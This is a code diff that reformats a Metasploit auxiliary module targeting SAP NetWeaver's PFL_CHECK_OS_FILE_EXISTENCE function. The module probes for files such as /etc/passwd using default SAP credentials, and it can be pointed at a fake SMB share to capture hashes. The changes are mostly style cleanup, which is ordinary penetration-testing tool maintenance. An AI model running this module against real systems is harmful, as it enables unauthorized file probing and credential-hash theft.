@@ -34,29 +34,32 @@ class MetasploitModule < Msf::Auxiliary
         The module can also be used to capture SMB hashes by using a fake SMB share as
         FILEPATH.
       },
-      'References' =>
-        [
-          [ 'OSVDB', '78537' ],
-          [ 'BID', '51645' ],
-          [ 'URL','http://erpscan.com/advisories/dsecrg-12-009-sap-netweaver-pfl_check_os_file_existence-missing-authorisation-check-and-smb-relay-vulnerability/' ]
-        ],
-      'Author' =>
-        [
-          'lexey Tyurin', # Vulnerability discovery
-          'nmonkee' # Metasploit module
-        ],
-      'License' => MSF_LICENSE
+      'References' => [
+        [ 'OSVDB', '78537' ],
+        [ 'BID', '51645' ],
+        [ 'URL', 'http://erpscan.com/advisories/dsecrg-12-009-sap-netweaver-pfl_check_os_file_existence-missing-authorisation-check-and-smb-relay-vulnerability/' ]
+      ],
+      'Author' => [
+        'lexey Tyurin', # Vulnerability discovery
+        'nmonkee' # Metasploit module
+      ],
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
     )
 
     register_options([
       OptString.new('CLIENT', [true, 'SAP Client', '001']),
       OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
       OptString.new('HttpPassword', [true, 'Password', '06071992']),
-      OptString.new('FILEPATH',[true,'File Path to check for  (e.g. /etc)','/etc/passwd'])
+      OptString.new('FILEPATH', [true, 'File Path to check for  (e.g. /etc)', '/etc/passwd'])
     ])
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     data = '<?xml version="1.0" encoding="utf-8" ?>'
     data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
     data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
@@ -79,15 +82,15 @@ class MetasploitModule < Msf::Auxiliary
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
         'ctype' => 'text/xml; charset=UTF-8',
         'headers' => {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
         },
         'vars_get' => {
           'sap-client' => datastore['CLIENT'],
           'sap-language' => 'EN'
         }
       })
-      if res and res.code == 200 and res.body =~ /PFL_CHECK_OS_FILE_EXISTENCE\.Response/
-        if res.body =~ /<FILE_EXISTS>X<\/FILE_EXISTS>/
+      if res && (res.code == 200) && res.body =~ /PFL_CHECK_OS_FILE_EXISTENCE\.Response/
+        if res.body =~ %r{<FILE_EXISTS>X</FILE_EXISTS>}
           print_good("#{rhost}:#{rport} - File #{datastore['FILEPATH']} exists")
         else
           print_warning("#{rhost}:#{rport} - File #{datastore['FILEPATH']} DOESN'T exist")
